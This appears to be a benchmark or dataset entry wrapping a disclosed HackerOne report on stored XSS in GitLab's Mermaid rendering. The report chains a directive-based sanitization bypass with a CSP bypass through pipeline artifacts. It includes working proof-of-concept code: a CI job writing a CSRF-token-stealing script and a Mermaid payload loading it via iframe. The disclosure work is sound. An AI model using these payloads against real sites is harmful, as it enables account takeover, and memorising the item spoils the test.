@@ -1,0 +1,45 @@
+{
+  "reported_to": "GitLab",
+  "reported_by": "saleemrashid ",
+  "title": "Stored XSS in Mermaid when viewing Markdown files",
+  "content": "\nSummary\nGitLab's Mermaid configuration allows an attacker to inject HTML in the rendered Markdown. This can be combined with a CSP bypass using pipeline artifacts to achieve RCE.\nSteps to reproduce\nCreate a repository on GitLab.com\nAdd the following to .gitlab-ci.yml\nCode 159 Bytes\n1---\n2job:\n3  script:\n4  - \"echo 'alert(parent.document.querySelector(\\\"meta[name=csrf-token]\\\").outerHTML)' > exploit.js\"\n5  artifacts:\n6    paths:\n7    - exploit.js\nWait for the pipeline to finish and record the job ID\nAdd the following to README.md, changing the project name (saleemrashid/mermaid-exploit-7032e404) and job ID (1303935016) accordingly\nCode 244 Bytes\n1```mermaid\n2%%{init: {\"flowchart\": {\"htmlLabels\": \"false\"}} }%%\n3flowchart\n4  A[\"<iframe srcdoc='<script src=https://gitlab.com/api/v4/projects/saleemrashid%2Fmermaid-exploit-7032e404/jobs/1303935016/artifacts/exploit.js></script>'></iframe>\"]\n5```\nOpen README.md (or any page that renders it, including the project overview page), and observe the alert containing the CSRF token (e.g. <meta name=\"csrf-token\" content=\"XXXXXX\">) caused by executing exploit.js\nImpact\nBecause the XSS leads to code execution as the authenticated user, this allows full account take-over without user interaction.\nExamples\nPrivate project on GitLab.com https://gitlab.com/saleemrashid/mermaid-exploit-7032e404\nWhat is the current bug behavior?\nMermaid supports HTML labels when flowchart.htmlLabels is enabled and securityLevel is not strict. GitLab's configuration disables this functionality https://gitlab.com/gitlab-org/gitlab/-/blob/v13.12.1-ee/app/assets/javascripts/behaviors/markdown/render_mermaid.js#L40-52\nCode 244 Bytes\n1  mermaid.initialize({\n2    // mermaid core options\n3    mermaid: {\n4      startOnLoad: false,\n5    },\n6    // mermaidAPI options\n7    theme,\n8    flowchart: {\n9      useMaxWidth: true,\n10      htmlLabels: false,\n11    },\n12    securityLevel: 'strict',\n13  });\nHowever, Mermaid also supports directives (https://mermaid-js.github.io/mermaid/#/directives) to alter the configuration. For security reasons, these directives aren't able to override certain configuration options https://github.com/mermaid-js/mermaid/blob/8.9.2/src/defaultConfig.js#L114-L120\nCode 417 Bytes\n1  /**\n2   * This option controls which currentConfig keys are considered _secure_ and can only be changed via\n3   * call to mermaidAPI.initialize. Calls to mermaidAPI.reinitialize cannot make changes to\n4   * the `secure` keys in the current currentConfig. This prevents malicious graph directives from\n5   * overriding a site's default security.\n6   */\n7  secure: ['secure', 'securityLevel', 'startOnLoad', 'maxTextSize'],\nWhile you can't override securityLevel, it turns out that overriding flowchart.htmlLabels to \"false\" (specifically the string, not the boolean) is sufficient to bypass the sanitization https://github.com/mermaid-js/mermaid/blob/8.9.2/src/diagrams/common/common.js#L34-L54\nCode 556 Bytes\n1  let htmlLabels = true;\n2  if (\n3    config.flowchart &&\n4    (config.flowchart.htmlLabels === false || config.flowchart.htmlLabels === 'false')\n5  ) {\n6    htmlLabels = false;\n7  }\n8\n9  if (htmlLabels) {\n10    const level = config.securityLevel;\n11\n12    if (level === 'antiscript') {\n13      txt = removeScript(txt);\n14    } else if (level !== 'loose') {\n15      // eslint-disable-line\n16      txt = breakToPlaceholder(txt);\n17      txt = txt.replace(/</g, '&lt;').replace(/>/g, '&gt;');\n18      txt = txt.replace(/=/g, '&equals;');\n19      txt = placeholderToBreak(txt);\n20    }\n21  }\nThe above code will not sanitize the label if flowchart.htmlLabels is set to false or \"false\". It seems like the intention is to not sanitize the label if it's going to be rendered as text, which makes sense. However, the code that actually decides whether to render it as HTML or text always uses if (config.flowchart.htmlLabels), which would succeed for the string \"false\" (because it's truthy). This means the sanitization is bypassed, but the string is still rendered as HTML, resulting in XSS.\nTo make use of the XSS, we need to bypass the CSP:\nCode 216 Bytes\n1script-src 'self' 'unsafe-inline' 'unsafe-eval' https://assets.gitlab-static.net https://www.google.com/recaptcha/ https://www.gstatic.com/recaptcha/ https://www.recaptcha.net/ https://apis.google.com 'nonce-<nonce>'\nUsing nonces causes the browser to ignore 'unsafe-inline', so we can't use inline scripts. However, we can take advantage of the fact that Workhorse will serve pipeline artifacts with an auto-detected Content-Type based on the file extension https://gitlab.com/gitlab-org/gitlab/-/blob/v13.12.1-ee/workhorse/internal/artifacts/entry.go#L98-101\nCode 236 Bytes\n1\t// Write http headers about the file\n2\theaders.Set(\"Content-Length\", contentLength)\n3\theaders.Set(\"Content-Type\", detectFileContentType(fileName))\n4\theaders.Set(\"Content-Disposition\", \"attachment; filename=\\\"\"+escapeQuotes(basename)+\"\\\"\")\nThe Content-Disposition header prevents this from being used for HTML/SVG-based XSS, but it still allows pipeline artifacts to be used as scripts or stylesheets. Because they are on the same domain, they satisfy 'self' in the CSP policy.\nFinally, RCE can be achieved by using the XSS to inject the following HTML, executing a pipeline artifact as JavaScript (<iframe srcdoc> is used because you can't directly inject a <script> tag with innerHTML). This example refers to an artifact on a private repository to maintain responsible disclosure, but you would enable public pipelines for an actual exploit (or add an access token to the URL) so the artifact is accessible by any user.\nCode 149 Bytes\n1<iframe srcdoc='<script src=https://gitlab.com/api/v4/projects/saleemrashid%2Fmermaid-exploit-7032e404/jobs/1303935016/artifacts/exploit.js></script>\nWhat is the expected correct behavior?\nMermaid should not allow HTML injection. While configuration changes and upstream bugfixes could improve the situation, it might be prudent to move Mermaid into a sandboxed iframe to avoid future vulnerabilities. For example, it also supports specifying themeCSS (which I attempted to use for a CSS exfiltration attack, but it wasn't practical to exfiltrate more than a few characters because the CSP didn't allow to @import files from an external server).\nAdditionally, Workhorse serving artifacts with dangerous Content-Type headers might not be secure behavior because it allows to bypass the CSP.\nOutput of checks\nThis bug happens on GitLab.com\nImpact\nBecause the XSS leads to code execution as the authenticated user, this allows full account take-over without user interaction.\n\n",
+  "severity": [
+    7.1,
+    null
+  ],
+  "bounty": 1000,
+  "weaknesses": [
+    "Cross-site Scripting (XSS) - DOM"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1634551200,
+  "report_url": "https://hackerone.com/reports/1212822",
+  "is_multi_component": false,
+  "complexity": "HIGH",
+  "novelty": "HIGH",
+  "vuln_category": "WEB_APP",
+  "steps": [
+    [
+      1,
+      "Create a repository on GitLab.com and add a malicious .gitlab-ci.yml file that generates an exploit.js artifact"
+    ],
+    [
+      2,
+      "Add a README.md with a Mermaid diagram directive that injects an iframe loading the exploit.js artifact via GitLab's API"
+    ]
+  ],
+  "vuln_description": "A stored XSS vulnerability in GitLab's Mermaid integration allows HTML injection through malformed flowchart configuration directives, combined with a CSP bypass using pipeline artifacts to achieve RCE by exfiltrating CSRF tokens.",
+  "reason": "This vulnerability requires deep understanding of multiple complex systems: Mermaid's configuration directives and sanitization logic, GitLab's artifact handling and CSP policies, and the interaction between these components. The attacker must recognize that setting htmlLabels to string 'false' bypasses sanitization while still rendering HTML, and must devise the artifact-based CSP bypass mechanism.",
+  "new_complexity": "VERY_HIGH",
+  "requires_code": true,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": null,
+  "injection_metadata": {
+    "is_simple_payload": false
+  },
+  "authnz_metadata": {
+    "reason": "The vulnerability involves stored XSS through Mermaid configuration in GitLab's Markdown rendering, which allows HTML injection and CSP bypass via pipeline artifacts. This is not directly related to authentication or authorization bypass through session or resource ID manipulation, but rather a client-side execution vulnerability that leads to account takeover by exploiting the rendering engine's behavior.",
+    "is_detectable": false
+  }
+}
